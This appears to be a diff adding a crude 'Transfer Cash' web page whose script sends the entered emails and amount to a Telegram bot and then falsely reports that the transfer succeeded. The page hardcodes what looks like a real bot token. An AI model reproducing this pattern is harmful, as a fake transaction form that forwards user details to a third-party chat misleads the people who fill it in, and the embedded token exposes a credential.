@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Transfer Cash</title>
+    <style>
+        /* styles.css */
+
+/* styles.css */
+
+body {
+    font-family: Arial, sans-serif;
+    margin: 0;
+    padding: 0;
+    background-color: #f8f9fa; /* Light Gray */
+}
+
+h2 {
+    text-align: center;
+    margin-top: 50px;
+    color: #343a40; /* Dark Gray */
+}
+
+#transfer-form {
+    max-width: 400px;
+    margin: 0 auto;
+    background-color: #fff;
+    padding: 20px;
+    border-radius: 10px;
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+}
+
+label {
+    display: block;
+    margin-bottom: 5px;
+    color: #007bff; /* Blue */
+}
+
+input[type="gmail"],
+input[type="number"],
+input[type="gmail2"],
+button[type="submit"] {
+    width: 100%;
+    padding: 10px;
+    margin-bottom: 15px;
+    border: 1px solid #ced4da; /* Light Gray */
+    border-radius: 5px;
+    box-sizing: border-box;
+    color: #495057; /* Dark Gray */
+}
+
+button[type="submit"] {
+    background-color: #28a745; /* Green */
+    color: #fff;
+    font-weight: bold;
+    cursor: pointer;
+}
+
+button[type="submit"]:hover {
+    background-color: #218838; /* Darker Green */
+}
+
+    </style>
+</head>
+<body>
+    <h2>Transfer Cash</h2>
+    <form id="transfer-form">
+        <label for="myemail" id="user-details"></label>
+        <label for="my gmail">My Email:</label>
+        <input type="gmail2" id="mygmail" required>
+        <label for="email">Email:</label>
+        <input type="gmail" id="email" required>
+        <label for="amount">Amount:</label>
+        <input type="number" id="amount" required>
+        <button type="submit">Send</button>
+    </form>
+
+    <script>
+        function sendMessageToTelegram(botToken, chatId, message) {
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            const payload = {
+                chat_id: chatId,
+                text: message
+            };
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Failed to send message to Telegram');
+                }
+                console.log('Message sent to Telegram');
+            })
+            .catch(error => console.error('Error sending message to Telegram:', error));
+        }
+
+        document.getElementById('transfer-form').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const botToken = '6475929197:AAHj_S6SCJqU6Odip6o5dZ8R3hQKytNGiBs';
+            const chatId = '5744028254'; // Replace with your actual chat ID
+            const email = document.getElementById('email').value;
+            const amount = document.getElementById('amount').value;
+            const mygmail = document.getElementById('mygmail').value;
+            const message = `Transfer request:\nRecipient Email: ${email}\nAmount: ${amount}\nSending Email: ${mygmail}`;
+
+            sendMessageToTelegram(botToken, chatId, message);
+
+            // Implement logic to handle the transfer here
+            console.log('Transfer request:');
+            console.log('Recipient Email:', email);
+            console.log('Amount:', amount);
+
+            // Optional: Redirect or display a success message to the user
+            alert('Transfer request sent successfully!');
+        });
+    </script>
+    <script src="script.js"></script>
+</body>
+</html>
